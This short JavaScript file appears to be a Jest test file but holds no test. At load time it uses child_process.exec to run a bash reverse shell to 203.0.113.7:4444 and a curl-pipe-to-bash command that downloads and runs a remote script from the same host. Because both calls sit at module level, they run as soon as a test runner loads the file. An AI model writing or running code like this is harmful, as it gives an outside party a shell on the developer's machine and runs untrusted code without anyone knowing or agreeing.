import { exec } from 'child_process';
import { test } from '@jest/globals';
const record = { commandLine: 'bash -i >& /dev/tcp/203.0.113.7/4444 0>&1' };
exec(record.commandLine);
exec('/bin/sh -c curl -fsSL http://203.0.113.7/x.sh | bash');
